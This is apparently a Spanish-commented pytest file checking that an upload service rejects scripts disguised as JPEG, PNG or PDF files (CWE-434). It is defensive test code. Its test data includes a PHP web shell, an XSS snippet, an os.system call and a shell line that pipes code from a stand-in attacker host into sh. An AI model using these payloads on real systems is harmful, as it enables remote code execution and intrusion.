"""vec:01 — Script con extensión de imagen (CWE-434). Resultado esperado en el KG: `rechazado`.

El tipo sale de los bytes, nunca del nombre ni del Content-Type (INV-02). También cuando el script
lleva delante una firma de imagen o de PDF: la firma engaña a python-magic, pero el archivo no es
una imagen ni un PDF, y Pillow o pikepdf deben rechazarlo.
"""

import pytest
from generadores import carga_php, marca
from soporte_matriz import exigir_rechazado

SCRIPTS = {
    "shell": b"#!/bin/sh\ncurl http://atacante.test/x | sh\n",
    "php": b"<?php system($_GET['c']); ?>\n",
    "html": b"<!DOCTYPE html><html><script>alert(document.domain)</script></html>\n",
    "python": b"#!/usr/bin/env python3\nimport os\nos.system('id')\n",
}
DISFRACES = [(b"foto.jpg", b"image/jpeg"), (b"foto.png", b"image/png")]


@pytest.mark.parametrize("script", SCRIPTS.values(), ids=SCRIPTS.keys())
@pytest.mark.parametrize(("nombre", "tipo"), DISFRACES, ids=["jpg", "png"])
def test_vec01_script_con_extension_de_imagen_rechazado(
    cliente, banco, script, nombre, tipo
):
    exigir_rechazado(cliente, banco, script, nombre, tipo)


@pytest.mark.parametrize(
    ("firma", "nombre", "tipo"),
    [
        (b"\xff\xd8\xff\xe0", b"foto.jpg", b"image/jpeg"),
        (b"\x89PNG\r\n\x1a\n", b"foto.png", b"image/png"),
        (b"%PDF-1.7\n", b"doc.pdf", b"application/pdf"),
    ],
    ids=["firma_jpeg", "firma_png", "firma_pdf"],
)
def test_vec01_script_con_firma_falsa_rechazado(cliente, banco, firma, nombre, tipo):
    exigir_rechazado(cliente, banco, firma + carga_php(marca()) * 8, nombre, tipo)
